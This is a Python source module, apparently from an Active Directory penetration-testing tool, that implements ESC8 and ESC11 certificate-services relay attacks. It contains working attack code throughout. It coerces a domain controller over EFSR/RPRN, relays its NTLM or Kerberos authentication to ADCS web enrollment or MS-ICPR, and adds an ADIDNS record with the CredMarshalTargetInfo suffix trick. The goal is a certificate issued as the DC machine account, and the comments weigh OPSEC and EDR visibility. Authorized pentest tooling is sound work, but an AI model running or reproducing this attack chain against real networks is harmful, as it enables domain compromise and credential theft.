"""Native ADCS coerce-and-relay exploitation flows."""

from __future__ import annotations

import asyncio
import socket
from dataclasses import dataclass
from pathlib import Path

from aiosmb.commons.connection.factory import SMBConnectionFactory

from adscan_core.rich_output import print_info_debug
from adscan_internal.rich_output import mark_sensitive, print_info
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
from adscan_internal.services.adcs_web_enrollment_probe import (
    ADCSWebEnrollmentProbe,
    WebEnrollmentProbeResult,
)
from adscan_internal.services.adidns import ADIDNSConfig, adidns_a_record_scope
from adscan_internal.services.coercion.runner import NativeCoercionRunConfig
from adscan_internal.services.relay import (
    AdcsEsc8RelayConfig,
    AdcsEsc8RelayTarget,
    AdcsEsc11RelayConfig,
    AdcsEsc11RelayTarget,
    NativeCoerceRelayConfig,
    NativeRelayRunConfig,
    run_native_coerce_and_relay,
)
from adscan_internal.services.relay.adcs_esc8_krb import AdcsEsc8KrbRelayTarget
from adscan_internal.services.relay.display import (
    print_relay_cert_result,
    print_relay_no_auth,
    print_relay_not_viable,
    print_relay_preflight,
)
from adscan_internal.services.relay.smb_krb_capture import SMBKrbCaptureConfig, SMBKrbCaptureListener

_COERCION_PROTOCOLS = ("EFSR", "RPRN")
_RELAY_SOURCE = "smb"
_RELAY_PORT = 445
_HTTP_PORT = 80
_HTTPS_PORT = 443
_SMB_PORT = 445

# James Forshaw CredMarshalTargetInfo suffix — causes Windows Kerberos SPN canonicalization
# to request a ticket for cifs/<ca_hostname>.<domain> (existing SPN on the CA machine account)
# even though the DNS alias starts with a different name. This is the key to Kerberos relay
# without needing a computer account or SPN write.
# Reference: mayfly277 blog / krbrelayx GOAD ESC8 walkthrough
_CRED_MARSHAL_SUFFIX = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"


# Honest, client-safe abort reasons for a non-viable ESC8 avenue. These are the
# EXISTENCE-condition case (no ESC8 vulnerability at all), NOT a closed avenue of
# a still-existing weakness — so they are surfaced as a neutral "not viable"
# outcome, never as ``closed_by_configuration`` (see CLAUDE.md § "Status
# vocabularies" → orthogonal-avenue vs existence-condition).
_ESC8_NOT_LISTENING_REASON = (
    "ADCS web enrollment is not listening on the CA — ESC8 is not viable; "
    "no certificate is obtainable from this host."
)
_ESC8_EPA_REASON = (
    "ADCS web enrollment is reachable only over HTTPS with Extended Protection "
    "for Authentication (channel binding) enforced — the relayed authentication "
    "is rejected, so ESC8 is not viable against this host."
)


@dataclass
class _Esc8SchemeDecision:
    """Result of the ESC8 relay pre-flight probe.

    Either a viable relay transport (``scheme`` + ``port``), or an
    ``abort_reason`` when the probe PROVED the CA web-enrollment avenue cannot
    yield a certificate. In the abort case the caller skips the coercion
    entirely — firing an OPSEC-costly, EDR-visible coercion against an endpoint
    that can never complete the relay is false effort, and the surviving
    "listener timed out" message would misdiagnose the cause.
    """

    scheme: str | None = None
    port: int | None = None
    abort_reason: str | None = None

    @property
    def viable(self) -> bool:
        return self.abort_reason is None


async def _resolve_esc8_scheme(config: EscConfig) -> _Esc8SchemeDecision:
    """Decide the certsrv scheme/port for the relay from a live HTTP-aware probe.

    The collector probe runs at collection time, not exploitation time, so its
    result is not reachable from this call site. We re-probe here — it is
    host-only (no credentials), fast, and HTTP-aware: it confirms the
    ``/certsrv/`` endpoint answers with a 401 + NTLM/Negotiate per scheme.

    The probe's own viability verdict is honored BEFORE any coercion:

    * Both TCP/80 and TCP/443 closed (certain, ADscan-observed) → the CA is not
      listening for web enrollment → ABORT: there is no ESC8 vulnerability here.
    * The sole avenue is HTTPS with EPA (channel binding) enforced, and HTTP is
      not available → the relay is defeated → ABORT.
    * A scheme answered with NTLM/Negotiate → relay to it (HTTPS preferred when
      both qualify; avoids the historical hardcode that always relayed to ``:80``).
    * Genuinely AMBIGUOUS (a port is OPEN but NTLM/Negotiate could not be
      confirmed, or the probe itself errored) → default to HTTP rather than
      aborting a chain the operator launched.
    """
    probe_host = config.ca_fqdn or config.ca_host
    if not probe_host:
        # No host to probe — cannot prove non-viability. Preserve the legacy
        # "default to http" behaviour for this ambiguous case.
        return _Esc8SchemeDecision(scheme="http", port=_HTTP_PORT)

    try:
        result: WebEnrollmentProbeResult = await ADCSWebEnrollmentProbe().probe(
            host=probe_host
        )
    except Exception:  # noqa: BLE001 — probe is best-effort; ambiguous → default http
        return _Esc8SchemeDecision(scheme="http", port=_HTTP_PORT)

    masked = mark_sensitive(probe_host, "host")

    # CERTAIN non-viability: BOTH web-enrollment ports ACTIVELY REFUSED the
    # connection — nothing is listening, so there is no certsrv endpoint to relay
    # to. Abort before the coercion. Crucially this keys on ``*_refused`` (a
    # ConnectionRefusedError), NOT on ``*_enabled`` (which is also False on a mere
    # TIMEOUT): a flaky/slow CA that times out is NOT a certain closure, and
    # treating it as one would false-abort a genuinely viable ESC8 whenever the
    # CA is momentarily unresponsive. A timeout falls through to the legacy
    # default-to-http below (attempt rather than false-abort).
    if result.https_refused and result.http_refused:
        print_info_debug(
            f"[esc8] web enrollment actively refused on 80+443 — aborting: host={masked}"
        )
        return _Esc8SchemeDecision(abort_reason=_ESC8_NOT_LISTENING_REASON)

    # CERTAIN non-viability: the only avenue is HTTPS and EPA is enforced. The
    # probe encodes this as web_enrollment_enabled=False with epa_enforced=True
    # while HTTP offers no NTLM avenue of its own.
    if (
        not result.web_enrollment_enabled
        and result.epa_enforced is True
        and result.https_ntlm
        and not result.http_ntlm
    ):
        print_info_debug(
            f"[esc8] only HTTPS avenue is EPA-enforced — aborting: host={masked}"
        )
        return _Esc8SchemeDecision(abort_reason=_ESC8_EPA_REASON)

    if result.answering_scheme == "https":
        print_info_debug(
            f"[esc8] relay scheme=https (certsrv offered NTLM/Negotiate over TLS): host={masked}"
        )
        return _Esc8SchemeDecision(scheme="https", port=_HTTPS_PORT)
    if result.answering_scheme == "http":
        print_info_debug(
            f"[esc8] relay scheme=http (certsrv offered NTLM/Negotiate): host={masked}"
        )
        return _Esc8SchemeDecision(scheme="http", port=_HTTP_PORT)

    # A port is open but NTLM/Negotiate could not be confirmed — genuinely
    # ambiguous. Keep the legacy default rather than aborting.
    print_info_debug(
        f"[esc8] probe did not confirm an NTLM/Negotiate certsrv endpoint; "
        f"defaulting relay to http: host={masked}"
    )
    return _Esc8SchemeDecision(scheme="http", port=_HTTP_PORT)


def _esc8_not_viable_result(technique: str, reason: str) -> EscResult:
    """Build the honest, neutral EscResult for an aborted-before-coercion ESC8.

    No coercion ran and nothing was changed on the domain, so ``rollback_ok``
    stays True. ``not_viable`` marks this as an existence-condition non-outcome
    (there is no ESC8 vulnerability), distinct from an ``attempted`` step that
    ran and failed.
    """
    print_relay_not_viable(technique=technique, reason=reason)
    return EscResult(
        success=False,
        esc=8,
        error=reason,
        evidence={"not_viable": True, "coercion_attempted": False},
    )


async def run_esc8(config: EscConfig) -> EscResult:
    """Run native ESC8: coerce a DC and relay NTLM to ADCS Web Enrollment."""

    listener_host = _listener_host(config)
    output_dir = Path(config.workspace_dir or ".") / "adcs" / "esc8"
    template = config.template or "DomainController"

    decision = await _resolve_esc8_scheme(config)
    if not decision.viable:
        return _esc8_not_viable_result("ESC8 — ADCS Web Enrollment", decision.abort_reason)
    scheme, port = decision.scheme, decision.port

    print_relay_preflight(
        technique=f"ESC8 — ADCS Web Enrollment ({scheme.upper()})",
        coerce_target=config.dc_ip,
        ca_host=config.ca_host,
        ca_name=config.ca_name or "ADCS-CA",
        template=template,
        listener_host=listener_host,
        listener_port=_RELAY_PORT,
        source=_RELAY_SOURCE,
        protocols=_COERCION_PROTOCOLS,
    )

    target = AdcsEsc8RelayTarget(
        AdcsEsc8RelayConfig(
            ca_host=config.ca_host,
            ca_fqdn=config.ca_fqdn,
            template=template,
            output_dir=output_dir,
            scheme=scheme,
            port=port,
        )
    )
    result = await _run_adcs_relay_chain(config, listener_host, target)
    return _relay_chain_to_esc_result(
        result, esc=8,
        technique="ESC8",
        fallback_error="ESC8 relay did not issue a certificate",
    )


async def run_esc11(config: EscConfig) -> EscResult:
    """Run native ESC11: coerce a DC and relay NTLM to MS-ICPR."""

    listener_host = _listener_host(config)
    output_dir = Path(config.workspace_dir or ".") / "adcs" / "esc11"
    template = config.template or "DomainController"

    print_relay_preflight(
        technique="ESC11 — MS-ICPR (RPC/DCOM)",
        coerce_target=config.dc_ip,
        ca_host=config.ca_host,
        ca_name=config.ca_name or "ADCS-CA",
        template=template,
        listener_host=listener_host,
        listener_port=_RELAY_PORT,
        source=_RELAY_SOURCE,
        protocols=_COERCION_PROTOCOLS,
    )

    target = AdcsEsc11RelayTarget(
        AdcsEsc11RelayConfig(
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template=template,
            output_dir=output_dir,
            domain=config.domain,
            dc_ip=config.dc_ip,
            ca_fqdn=config.ca_fqdn,
        )
    )
    result = await _run_adcs_relay_chain(config, listener_host, target)
    return _relay_chain_to_esc_result(
        result, esc=11,
        technique="ESC11",
        fallback_error="ESC11 relay did not issue a certificate",
    )


async def _run_adcs_relay_chain(config: EscConfig, listener_host: str, target):
    """Shared native coerce + SMB relay chain for ADCS relay ESCs."""

    # When Kerberos is requested, aiosmb derives ``cifs/<target>`` from the
    # first arg. Pass the DC FQDN so the SPN matches the registration; fall
    # back to the IP only for NTLM (where SPN is irrelevant).
    smb_target = (
        config.dc_fqdn if (config.use_kerberos and config.dc_fqdn) else config.dc_ip
    )
    factory = SMBConnectionFactory.from_components(
        smb_target,
        config.username,
        config.effective_secret or "",
        secrettype=_secret_type(config.effective_secret or ""),
        domain=config.auth_domain or config.domain,
        dcip=config.auth_kdc or config.dc_ip,
        authproto="kerberos" if config.use_kerberos else "ntlm",
    )

    return await run_native_coerce_and_relay(
        targets=[target],
        coercion_connection_factory=factory,
        coercion_target_host=config.dc_ip,
        coercion_target_name=config.dc_ip,
        config=NativeCoerceRelayConfig(
            listener_host=listener_host,
            relay=NativeRelayRunConfig(
                source=_RELAY_SOURCE,
                listen_host="0.0.0.0",
                listen_port=_RELAY_PORT,
                max_authentications=1,
                timeout_seconds=120,
                stop_on_first_success=True,
            ),
            coercion=NativeCoercionRunConfig(
                listener_host=listener_host,
                listener_auth_type="smb",
                timeout_seconds=60,
                protocols=_COERCION_PROTOCOLS,
                transports=("ncan_np",),
                show_summary=False,
            ),
        ),
    )


async def run_esc8_krb(config: EscConfig) -> EscResult:
    """ESC8 Kerberos relay — DNS prefix trick + SMB capture → opaque forward to certsrv.

    Flow (matches mayfly277 blog / krbrelayx approach):
      1. Derive relay alias from CA hostname: <ca_hostname><random>.<domain>
         e.g. kingslanding7f3a.sevenkingdoms.local
         This prefix causes Windows to resolve the Kerberos SPN using the CA machine account
         (cifs/kingslanding.sevenkingdoms.local on KINGSLANDING$) — no SPN write needed.
      2. Add ADIDNS A record: relay_alias → listener_host
      3. Start SMB listener on port 445
      4. Coerce DC via EFSR/RPRN → DC authenticates to relay alias via SMB Kerberos
         (ticket encrypted with KINGSLANDING$'s key because SPN maps to the CA machine)
      5. Capture the raw SPNEGO blob from SMB SESSION_SETUP
      6. Forward the blob opaquely to certsrv via HTTP — IIS on the CA decrypts with its
         own machine key → certificate issued as the coerced DC machine account
      7. Cleanup: delete DNS record (RAII)

    No computer account creation, no SPN write — DNS-only setup.
    """
    listener_host = _listener_host(config)
    output_dir = Path(config.workspace_dir or ".") / "adcs" / "esc8_krb"
    template = config.template or "DomainController"

    # Honor the probe's viability verdict BEFORE creating the ADIDNS record or
    # coercing — both are OPSEC-costly and pointless if the CA cannot answer.
    decision = await _resolve_esc8_scheme(config)
    if not decision.viable:
        return _esc8_not_viable_result(
            "ESC8 — Kerberos relay", decision.abort_reason
        )
    scheme, port = decision.scheme, decision.port

    # Relay alias: <ca_short_hostname><CredMarshalTargetInfo suffix>
    # The fixed suffix causes Windows Kerberos to canonicalize the SPN to
    # cifs/<ca_hostname>.<domain> (existing SPN on the CA machine account).
    # This is the James Forshaw / mayfly277 DNS prefix trick.
    ca_short = _ca_short_hostname(config)
    relay_name = config.relay_hostname or f"{ca_short}{_CRED_MARSHAL_SUFFIX}"
    relay_fqdn = f"{relay_name}.{config.domain}"

    print_relay_preflight(
        technique="ESC8 — Kerberos relay (DNS prefix trick, opaque forward)",
        coerce_target=config.dc_ip,
        ca_host=config.ca_host,
        ca_name=config.ca_name or "ADCS-CA",
        template=template,
        listener_host=listener_host,
        listener_port=_SMB_PORT,
        source="smb-krb",
        protocols=_COERCION_PROTOCOLS,
    )
    print_info(
        f"Relay alias: [cyan]{mark_sensitive(relay_fqdn, 'hostname')}[/] → "
        f"{mark_sensitive(listener_host, 'ip')}  "
        f"(prefix matches CA hostname → reuses existing SPN)"
    )

    dns_cfg = ADIDNSConfig(
        dc_ip=config.dc_ip,
        domain=config.domain,
        username=config.username,
        password=config.effective_secret or "",
    )

    krb_target = AdcsEsc8KrbRelayTarget(
        AdcsEsc8RelayConfig(
            ca_host=config.ca_host,
            ca_fqdn=config.ca_fqdn,
            template=template,
            output_dir=output_dir,
            scheme=scheme,
            port=port,
        )
    )

    async with adidns_a_record_scope(dns_cfg, relay_name, listener_host):
        await asyncio.sleep(60)  # Windows DNS needs ~60s to propagate ADIDNS records from LDAP
        result = await _run_adcs_smb_krb_relay_chain(
            config, listener_host, relay_name, relay_fqdn, krb_target
        )

    return _relay_result_to_esc(
        result,
        esc=8,
        technique="ESC8-KRB",
        fallback_error="ESC8 Kerberos relay did not issue a certificate",
    )


async def _run_adcs_smb_krb_relay_chain(
    config: EscConfig,
    listener_host: str,
    coerce_listener_name: str,
    relay_fqdn: str,
    target: AdcsEsc8KrbRelayTarget,
) -> object:
    """Start SMB listener + coerce DC to authenticate via Kerberos SMB → opaque relay.

    coerce_listener_name is the short hostname (no domain) embedded in the UNC path sent
    to the victim during coercion. Windows Kerberos SPN canonicalization sees the
    CredMarshalTargetInfo suffix in the hostname and requests a ticket for the CA machine
    account SPN instead of constructing a new non-existent SPN.
    """
    capture_queue: asyncio.Queue[bytes] = asyncio.Queue()
    listener = SMBKrbCaptureListener(
        SMBKrbCaptureConfig(
            listen_host="0.0.0.0",
            listen_port=_SMB_PORT,
            timeout_seconds=120.0,
        ),
        capture_queue,
    )

    # When Kerberos is requested, aiosmb derives ``cifs/<target>`` from the
    # first arg. Pass the DC FQDN so the SPN matches the registration; fall
    # back to the IP only for NTLM (where SPN is irrelevant).
    smb_target = (
        config.dc_fqdn if (config.use_kerberos and config.dc_fqdn) else config.dc_ip
    )
    factory = SMBConnectionFactory.from_components(
        smb_target,
        config.username,
        config.effective_secret or "",
        secrettype=_secret_type(config.effective_secret or ""),
        domain=config.auth_domain or config.domain,
        dcip=config.auth_kdc or config.dc_ip,
        authproto="kerberos" if config.use_kerberos else "ntlm",
    )

    await listener.start()
    try:
        coercion_task = asyncio.create_task(
            _coerce_smb_krb(config, factory, coerce_listener_name)
        )
        try:
            spnego_bytes = await asyncio.wait_for(capture_queue.get(), timeout=120.0)
        except asyncio.TimeoutError:
            coercion_task.cancel()
            from adscan_internal.services.relay.core import RelayRunResult
            return _KrbRelayChainResult(
                relay_result=RelayRunResult(results=(), timed_out=True, authentications_seen=0),
                coercion_success=False,
                coercion_attempts=0,
            )

        relay_result_item = await target.run(spnego_bytes)
        coercion_task.cancel()
    finally:
        await listener.stop()

    from adscan_internal.services.relay.core import RelayRunResult
    return _KrbRelayChainResult(
        relay_result=RelayRunResult(
            results=(relay_result_item,),
            timed_out=False,
            authentications_seen=1,
        ),
        coercion_success=True,
        coercion_attempts=1,
    )


async def _coerce_smb_krb(config: EscConfig, factory, coerce_listener_name: str) -> None:
    """Trigger coercion — DC authenticates via Kerberos to the relay alias hostname.

    coerce_listener_name must be the short hostname (no FQDN, no IP) so that Windows
    Kerberos applies SPN canonicalization. Using a FQDN or IP would bypass canonicalization
    and cause NTLM fallback instead of Kerberos.
    """
    from adscan_internal.services.coercion.runner import run_native_coercion

    # target_name must be the victim's DNS hostname (not IP) so the RPC bind uses the
    # correct DC identity. The listener embedded in the coercion UNC path is the relay alias.
    target_name = config.ca_fqdn or config.ca_host or config.dc_ip

    await run_native_coercion(
        connection_factory=factory,
        target_host=config.dc_ip,
        target_name=target_name,
        config=NativeCoercionRunConfig(
            listener_host=coerce_listener_name,
            listener_auth_type="smb",
            timeout_seconds=60,
            protocols=_COERCION_PROTOCOLS,
            transports=("ncan_np",),
            show_summary=False,
        ),
    )


class _KrbRelayChainResult:
    """Minimal result container mirroring NativeCoerceRelayResult for ESC8-KRB."""

    def __init__(self, relay_result, coercion_success: bool, coercion_attempts: int) -> None:
        self.relay_result = relay_result
        self.coercion_success = coercion_success
        self.coercion_attempts = coercion_attempts

    @property
    def success(self) -> bool:
        return self.relay_result.success


def _relay_result_to_esc(
    result: _KrbRelayChainResult,
    *,
    esc: int,
    technique: str,
    fallback_error: str,
) -> EscResult:
    relay_results = result.relay_result.results
    first_success = next((item for item in relay_results if item.success), None)

    if first_success is not None:
        pfx_path = first_success.artifact_paths[0] if first_success.artifact_paths else None
        if pfx_path:
            print_relay_cert_result(
                technique=technique,
                principal=first_success.principal,
                pfx_path=pfx_path,
                cert_serial=first_success.metadata.get("cert_serial"),
                cert_subject=first_success.metadata.get("cert_subject"),
                request_id=first_success.metadata.get("request_id"),
            )
        return EscResult(
            success=True,
            esc=esc,
            pfx_path=pfx_path,
            evidence={
                "coercion_success": result.coercion_success,
                "principal": first_success.principal,
                **first_success.metadata,
            },
        )

    print_relay_no_auth(
        technique=technique,
        timed_out=result.relay_result.timed_out,
        coercion_success=result.coercion_success,
    )
    error = fallback_error
    if relay_results:
        error = relay_results[-1].error or error
    return EscResult(
        success=False, esc=esc, error=error,
        evidence={
            "coercion_success": result.coercion_success,
            "relay_timed_out": result.relay_result.timed_out,
        },
    )


def _infer_ca_samname(config: EscConfig) -> str:
    """Derive the CA machine sAMAccountName from ca_fqdn or ca_host."""
    fqdn = config.ca_fqdn or ""
    hostname = fqdn.split(".")[0] if fqdn else (config.ca_host or "")
    return f"{hostname.upper()}$" if hostname else ""


def _relay_chain_to_esc_result(
    result, *, esc: int, technique: str, fallback_error: str
) -> EscResult:
    relay_results = result.relay_result.results
    first_success = next((item for item in relay_results if item.success), None)

    if first_success is not None:
        pfx_path = (
            first_success.artifact_paths[0] if first_success.artifact_paths else None
        )
        if pfx_path:
            print_relay_cert_result(
                technique=technique,
                principal=first_success.principal,
                pfx_path=pfx_path,
                cert_serial=first_success.metadata.get("cert_serial"),
                cert_subject=first_success.metadata.get("cert_subject"),
                request_id=first_success.metadata.get("request_id"),
            )
        return EscResult(
            success=True,
            esc=esc,
            pfx_path=pfx_path,
            evidence={
                "coercion_success": result.coercion_success,
                "coercion_attempts": result.coercion_attempts,
                "relay_authentications_seen": result.relay_result.authentications_seen,
                "principal": first_success.principal,
                **first_success.metadata,
            },
        )

    print_relay_no_auth(
        technique=technique,
        timed_out=result.relay_result.timed_out,
        coercion_success=result.coercion_success,
    )
    error = fallback_error
    if relay_results:
        error = relay_results[-1].error or error
    return EscResult(
        success=False,
        esc=esc,
        error=error,
        evidence={
            "coercion_success": result.coercion_success,
            "coercion_attempts": result.coercion_attempts,
            "relay_authentications_seen": result.relay_result.authentications_seen,
            "relay_timed_out": result.relay_result.timed_out,
            "relay_errors": [item.error for item in relay_results if item.error],
        },
    )


def _listener_host(config: EscConfig) -> str:
    shell = config.shell
    candidate = (
        str(getattr(shell, "myip", "") or "").strip() if shell is not None else ""
    )
    if candidate:
        return candidate
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect((config.dc_ip, 445))
        return str(sock.getsockname()[0])


def _secret_type(secret: str) -> str:
    candidate = str(secret or "").strip()
    if len(candidate) == 32 and all(
        char in "0123456789abcdefABCDEF" for char in candidate
    ):
        return "nt"
    return "password"


def _ca_short_hostname(config: EscConfig) -> str:
    """Extract the short (NetBIOS) hostname of the CA from the config.

    The relay alias is prefixed with the CA hostname so that Windows Kerberos SPN
    canonicalization resolves ``cifs/<ca_hostname>.<domain>`` — an existing SPN on the
    CA machine account — instead of a non-existent SPN on a new host.  This is the
    James Forshaw / mayfly277 DNS prefix trick: no SPN write or computer account needed.
    """
    fqdn = config.ca_fqdn or ""
    short = fqdn.split(".")[0] if fqdn else ""
    if not short:
        short = (config.ca_host or "").split(".")[0]
    return short.lower() or "ca"
